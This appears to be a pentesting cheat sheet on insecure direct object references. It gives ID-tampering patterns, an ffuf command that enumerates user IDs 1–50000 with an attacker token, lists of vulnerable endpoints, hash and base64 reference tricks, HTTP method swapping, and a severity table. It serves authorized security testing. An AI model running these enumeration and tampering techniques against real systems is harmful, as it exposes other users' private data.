# IDOR — Insecure Direct Object Reference

**CWE:** CWE-639 | **OWASP:** A01:2021 (Broken Access Control)

---

## What to Look For

Any user-controlled identifier that references a resource:

```
/api/user/1234             → try 1235
/api/invoice/550e8400      → try another UUID
/download?file=report.pdf  → try other filenames
/api/account?uid=me        → try uid=other_user_id
```

---

## Finding IDORs

```bash
# Step 1: Create two accounts (attacker + victim)
# Step 2: Use victim account, find object IDs (order, profile, message, etc.)
# Step 3: Switch to attacker account
# Step 4: Try to access victim's object IDs

# Automated ID enumeration with FFUF
ffuf -u https://target.com/api/user/FUZZ \
  -w <(seq 1 50000) \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -mc 200 -t 50 -o idor_results.json

# Burp Intruder — enumerate IDs with Sniper attack
```

---

## Common IDOR Locations

```
Profile/account data:     GET /api/users/{id}
Documents/files:          GET /api/documents/{id}
Messages:                 GET /api/messages/{id}
Orders/invoices:          GET /api/orders/{id}
Admin actions:            POST /api/admin/users/{id}/disable
Export functions:         GET /export?report_id={id}
Password reset:           POST /reset?token={token}&user_id={id}
Email preferences:        PUT /api/notifications/{id}
```

---

## Non-Numeric IDORs

```bash
# UUID-based (v4) — still test, sometimes predictable or sequential
GET /api/invoice/550e8400-e29b-41d4-a716-446655440000

# Hash-based — try hash of other user IDs
# If user_id=1 → hash(1) = c4ca4238a0b923820dcc509a6f75849b
# Then try c4ca4238a0b923820dcc509a6f75849b for user 1

# Indirect reference — username/email as reference
GET /api/profile?user=victim@email.com

# Encoded references
GET /api/data?ref=dXNlcjoxMjM0  (base64 of "user:1234")
```

---

## HTTP Method Escalation

```
GET /api/admin/users/1234  → 403
DELETE /api/admin/users/1234 → 200?  ← method-based access control failure
```

---

## Impact Classification

| Data Accessed | Severity |
|--------------|----------|
| Full PII (SSN, passport, financial) | Critical |
| Account takeover via email change | Critical |
| Another user's PII (name, address) | High |
| Private messages or files | High |
| Non-sensitive metadata | Medium |
| Own data accessed via different method | Low |
